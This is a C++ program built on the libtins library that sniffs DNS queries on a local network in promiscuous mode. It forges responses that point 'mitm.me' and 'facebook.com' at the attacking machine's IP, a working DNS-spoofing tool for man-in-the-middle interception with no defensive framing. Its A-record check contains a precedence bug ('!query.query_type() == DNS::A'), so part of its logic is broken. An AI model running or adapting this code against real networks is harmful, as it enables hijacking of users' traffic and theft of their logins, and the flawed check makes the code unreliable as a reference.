#include <tins/tins.h>
#include <iostream>

using std::cout;
using std::endl;
using std::string;

using namespace Tins;

PacketSender sender;
IPv4Address myIp;

bool callback(const PDU& pdu) {
    // DNS packet on LAN: EthernetII / IP / UDP / RawPDU
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    if (dns.type() == DNS::QUERY) {
        // Let's see if there's any query for an "A" record.
        for (const auto& query : dns.queries()) {
            if (!query.query_type() == DNS::A) continue;
            // "A" record query, spoof response
            string hostname = query.dname();
            if(hostname == "mitm.me") {
                dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
            }
            if(hostname == "facebook.com") {
                dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
            }
        }
        if (dns.answers_count() > 0) {  // Have we added some answers?
            dns.type(DNS::RESPONSE);    // It's a response now
            dns.recursion_available(1); // Recursion is available(just in case)
            auto pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                       IP(ip.src_addr(), ip.dst_addr()) /
                       UDP(udp.sport(), udp.dport()) /
                       dns;
            sender.send(pkt);
        }
    }
    return true;
}

int main(int argc, char* argv[]) {
    if(argc != 2) {
        cout << "Usage: " <<* argv << " <interface>" << endl;
        return 1;
    }
    SnifferConfiguration config;
    config.set_promisc_mode(true);   // Sniff everything
    config.set_immediate_mode(true); // Use immediate mode so we get the packets as fast as we can
    config.set_filter("udp and dst port 53"); // Normally DNS
    Sniffer sniffer(argv[1], config);

    sender.default_interface(argv[1]); // All packets will be sent through the provided interface
    myIp = NetworkInterface(argv[1]).info().ip_addr;
    sniffer.sniff_loop(callback);
}